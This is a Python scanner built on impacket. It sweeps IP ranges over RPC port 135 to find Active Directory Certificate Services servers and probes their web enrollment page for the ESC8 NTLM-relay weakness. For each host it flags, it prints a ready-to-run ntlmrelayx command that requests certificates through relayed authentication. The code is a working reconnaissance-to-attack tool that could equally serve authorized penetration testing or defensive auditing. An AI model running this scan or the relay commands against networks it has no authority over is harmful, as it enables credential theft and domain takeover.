import argparse
import threading
import queue
import ipaddress
import os
import requests
import logging
from impacket import uuid
from impacket.dcerpc.v5 import transport, epm

# Initialize logging
logging.basicConfig(level=logging.CRITICAL)  # Suppress all logging output

# Global print lock and vulnerable targets list
print_lock = threading.Lock()
vulnerable_targets = []
vulnerable_targets_lock = threading.Lock()

def make_http_request(ip):
    url = f"http://{ip}/certsrv/certfnsh.asp"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 401 and "Access is denied" in response.text:
            return True, None  # Indicates potential vulnerability
        else:
            return False, None
    except requests.RequestException:
        return False, None

def parse_input_line(line):
    line = line.strip()
    if not line:
        return []
    try:
        if '/' in line:
            return [str(ip) for ip in ipaddress.ip_network(line, strict=False)]
        else:
            ipaddress.ip_address(line)
            return [line]
    except ValueError:
        # Line is not an IP address or CIDR, assume it's a hostname
        return [line]

def is_valid_ip(input_string):
    try:
        ipaddress.ip_address(input_string)
        return True
    except ValueError:
        return False

class RPCDump:
    KNOWN_PROTOCOLS = {
        135: {'bindstr': r'ncacn_ip_tcp:%s[135]'},
        139: {'bindstr': r'ncacn_np:%s[\pipe\epmapper]'},
        443: {'bindstr': r'ncacn_http:[593,RpcProxy=%s:443]'},
        445: {'bindstr': r'ncacn_np:%s[\pipe\epmapper]'},
        593: {'bindstr': r'ncacn_http:%s'}
    }

    def __init__(self, username='', password='', domain='', hashes=None, port=135):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__port = port
        self.__stringbinding = ''
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def dump(self, remoteName, remoteHost):
        entries = []

        self.__stringbinding = self.KNOWN_PROTOCOLS[self.__port]['bindstr'] % remoteName
        rpctransport = transport.DCERPCTransportFactory(self.__stringbinding)

        if self.__port in [139, 445]:
            rpctransport.set_credentials(self.__username, self.__password, self.__domain,
                                         self.__lmhash, self.__nthash)
            rpctransport.setRemoteHost(remoteHost)
            rpctransport.set_dport(self.__port)
        elif self.__port in [443]:
            rpctransport.set_credentials(self.__username, self.__password, self.__domain,
                                         self.__lmhash, self.__nthash)
            rpctransport.set_auth_type(transport.HTTPTransport.AUTH_NTLM)

        try:
            entries = self.__fetchList(rpctransport)
        except Exception:
            pass  # Suppress exceptions to reduce verbose output

        return entries

    def __fetchList(self, rpctransport):
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        resp = epm.hept_lookup(None, dce=dce)
        dce.disconnect()
        return resp

def worker(ip_queue, progress):
    while True:
        ip = ip_queue.get()
        if ip is None:
            break

        # Initialize a list to accumulate messages
        output_messages = []

        # Output the IP or hostname currently being tested
        output_messages.append(f"Testing {ip}")

        found_vulnerable = False  # Flag to check if vulnerability was found

        try:
            dumper = RPCDump(port=135)
            entries = dumper.dump(ip, ip)
            if entries:
                endpoints = {}
                for entry in entries:
                    binding = epm.PrintStringBinding(entry['tower']['Floors'])
                    tmpUUID = str(entry['tower']['Floors'][0])
                    if tmpUUID not in endpoints:
                        endpoints[tmpUUID] = {}
                        endpoints[tmpUUID]['Bindings'] = []
                    uuid_bin = uuid.uuidtup_to_bin(uuid.string_to_uuidtup(tmpUUID))[:18]
                    if uuid_bin in epm.KNOWN_UUIDS:
                        endpoints[tmpUUID]['EXE'] = epm.KNOWN_UUIDS[uuid_bin]
                    else:
                        endpoints[tmpUUID]['EXE'] = 'N/A'
                    endpoints[tmpUUID]['annotation'] = entry['annotation'][:-1].decode('utf-8')
                    endpoints[tmpUUID]['Bindings'].append(binding)

                # Check if 'certsrv.exe' is among the endpoints
                for endpoint in endpoints:
                    exe_name = endpoints[endpoint]['EXE'].lower()
                    if 'certsrv.exe' in exe_name:
                        output_messages.append(f"\nADCS Server identified on {ip}")
                        output_messages.append(f"Checking for ESC8 vulnerability on {ip}")

                        is_vulnerable, _ = make_http_request(ip)
                        if is_vulnerable:
                            output_messages.append(f"Vulnerable Web Enrollment endpoint found: http://{ip}/certsrv/certfnsh.asp\n")
                            # Add the vulnerable target to the list
                            with vulnerable_targets_lock:
                                vulnerable_targets.append(ip)
                            found_vulnerable = True
                        else:
                            output_messages.append(f"No vulnerability found on {ip}\n")
                        break  # Exit after finding certsrv.exe
            else:
                pass  # No endpoints found; do not output
        except Exception:
            pass  # Suppress exceptions to reduce verbose output

        # Print all messages at once
        with print_lock:
            print('\n'.join(output_messages))

        with progress.get_lock():
            progress.value += 1
        ip_queue.task_done()

def run_rpcdump_concurrently(ip_list):
    num_worker_threads = 10
    ip_queue = queue.Queue()

    class Progress:
        def __init__(self, total):
            self.value = 0
            self.total = total
            self._lock = threading.Lock()

        def get_lock(self):
            return self._lock

    progress = Progress(len(ip_list))

    threads = []
    for _ in range(num_worker_threads):
        t = threading.Thread(target=worker, args=(ip_queue, progress))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        for ip in ip_list:
            ip_queue.put(ip.strip())

        ip_queue.join()
    except KeyboardInterrupt:
        for _ in range(num_worker_threads):
            ip_queue.put(None)
        for t in threads:
            t.join()

def main():
    try:
        parser = argparse.ArgumentParser(description='Script to scan for vulnerable Web Enrollment endpoints.')
        parser.add_argument('-t', '--target', required=True, help='File path, CIDR range, IP address, or hostname to scan.')
        args = parser.parse_args()

        user_input = args.target

        if os.path.isfile(user_input):
            ip_list = []
            with open(user_input, 'r') as file:
                for line in file:
                    ip_list.extend(parse_input_line(line.strip()))
            # Remove duplicate IPs
            ip_list = list(set(ip_list))
            run_rpcdump_concurrently(ip_list)
        else:
            ip_list = parse_input_line(user_input)
            if ip_list:
                ip_list = list(set(ip_list))
                run_rpcdump_concurrently(ip_list)
            else:
                print("Invalid input. Please enter a valid file path, CIDR range, IP address, or hostname.")

        # After scanning is complete, output the command if vulnerabilities were found
        if vulnerable_targets:
            with print_lock:
                print("\nVulnerable targets found:")
                for target in vulnerable_targets:
                    print(f" - {target}")
                print("\nYou can use the following command(s):")
                for target in vulnerable_targets:
                    print(f"impacket-ntlmrelayx -t http://{target}/certsrv/certfnsh.asp -smb2support --adcs --template 'user'")
        else:
            with print_lock:
                print("\nNo vulnerable targets were found.")

    except KeyboardInterrupt:
        print("\nOperation interrupted by user. Exiting gracefully.")

if __name__ == "__main__":
    main()
